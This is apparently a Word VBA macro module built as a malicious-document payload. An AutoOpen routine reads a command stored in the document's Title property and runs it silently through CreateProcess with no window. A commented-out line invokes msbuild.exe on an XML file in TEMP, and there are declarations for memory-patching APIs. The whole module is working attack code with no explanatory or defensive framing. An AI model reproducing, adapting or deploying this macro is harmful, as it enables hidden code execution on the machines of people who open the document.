Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal Milliseconds As LongPtr)

Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long

Private Declare PtrSafe Sub ByteSwapper Lib "kernel32.dll" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)

Private Declare PtrSafe Sub Peek Lib "msvcrt" Alias "memcpy" (ByRef pDest As Any, ByRef pSource As Any, ByVal nBytes As Long)

Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare PtrSafe Function OpenProcess Lib "kernel32.dll" (ByVal dwAccess As Long, ByVal fInherit As Integer, ByVal hObject As Long) As Long
Private Declare PtrSafe Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Const CREATE_NO_WINDOW = &H8000000
Const CREATE_NEW_CONSOLE = &H10
Function ReadProp(sPropName As String) As Variant

Dim bCustom As Boolean
Dim sValue As String

  On Error GoTo ErrHandlerReadProp
  'Try the built-in properties first
  'An error will occur if the property doesn't exist
  sValue = ActiveDocument.BuiltInDocumentProperties(sPropName).Value
  ReadProp = sValue
  Exit Function

ContinueCustom:
  bCustom = True

Custom:
  sValue = ActiveDocument.CustomDocumentProperties(sPropName).Value
  ReadProp = sValue
  Exit Function

ErrHandlerReadProp:
  Err.Clear
  'The boolean bCustom has the value False, if this is the first
  'time that the errorhandler is runned
  If Not bCustom Then
    'Continue to see if the property is a custom documentproperty
    Resume ContinueCustom
  Else
    'The property wasn't found, return an empty string
    ReadProp = ""
    Exit Function
  End If

End Function

Sub CallMe()
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim lSuccess As Long
    Dim lRetValue As Long

    Dim comando As String
    ' comando = "c:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe " & Environ("TEMP") & "\office2.xml"
    
    Dim PropVal As String
    
	' Replace the value of the propertie Title with the command you want to execute
    PropVal = ReadProp("Title")
    
    comando = PropVal
    lSuccess = CreateProcess(sNull, comando, ByVal 0&, ByVal 0&, 1&, CREATE_NO_WINDOW, ByVal 0&, sNull, sInfo, pInfo)

    lRetValue = CloseHandle(pInfo.hThread)
    lRetValue = CloseHandle(pInfo.hProcess)

    Sleep (2345)
    
End Sub
Sub AutoOpen()
    Call CallMe
End Sub
